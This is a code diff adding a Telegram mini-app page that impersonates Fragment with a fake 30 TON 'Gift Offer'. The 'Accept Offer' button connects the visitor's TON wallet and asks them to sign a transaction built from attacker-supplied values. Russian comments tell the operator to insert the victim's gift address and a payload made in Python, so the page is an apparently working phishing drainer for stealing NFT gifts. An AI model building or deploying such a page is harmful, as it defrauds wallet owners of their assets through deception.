@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Fragment</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
+        .card { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 16px; padding: 24px; max-width: 400px; width: 100%; text-align: center; }
+        .logo { font-size: 20px; font-weight: bold; margin-bottom: 20px; color: #0098ea; }
+        .img { width: 120px; height: 120px; background: #2a2a2a; border-radius: 12px; margin: 0 auto 16px; }
+        .title { font-size: 18px; font-weight: bold; margin-bottom: 8px; }
+        .price { font-size: 28px; font-weight: bold; color: #0098ea; margin: 20px 0; }
+        .btn { background: #0098ea; color: #fff; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; }
+        .btn:disabled { opacity: 0.5; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">Fragment</div>
+        <div class="img"></div>
+        <div class="title">Gift Offer</div>
+        <div class="price">30 TON</div>
+        <p style="color: #888; font-size: 13px;">Buyer wants to purchase your gift</p>
+        <button class="btn" id="btn" onclick="accept()">Accept Offer</button>
+    </div>
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready(); tg.expand();
+        
+        // Ссылка на твой манифест (уже правильная)
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
+            manifestUrl: "https://jejemakersx-netizen.github.io/fsdfdsfsdfsf/tonconnect-manifest.json" 
+        });
+        
+        // ВСТАВЬ СЮДА СВОИ ДАННЫЕ:
+        const NFT_ADDRESS = "СЮДА_АДРЕС_ПОДАРКА_ЖЕРТВЫ";
+        const PAYLOAD_B64 = "СЮДА_ТВОЙ_ПЕЙЛОАД_ИЗ_ПИТОНА";
+
+        async function accept() {
+            const btn = document.getElementById('btn');
+            btn.disabled = true; btn.innerText = "Processing...";
+            try {
+                if (!tonConnectUI.connected) await tonConnectUI.connectWallet();
+                await tonConnectUI.sendTransaction({
+                    validUntil: Math.floor(Date.now() / 1000) + 300,
+                    messages: [{ address: NFT_ADDRESS, amount: "50000000", payload: PAYLOAD_B64 }]
+                });
+                btn.innerText = "Completed";
+                tg.HapticFeedback.notificationOccurred('success');
+            } catch (e) {
+                btn.disabled = false; btn.innerText = "Accept Offer";
+                alert("Error: " + e.message);
+            }
+        }
+    </script>
+</body>
+</html>
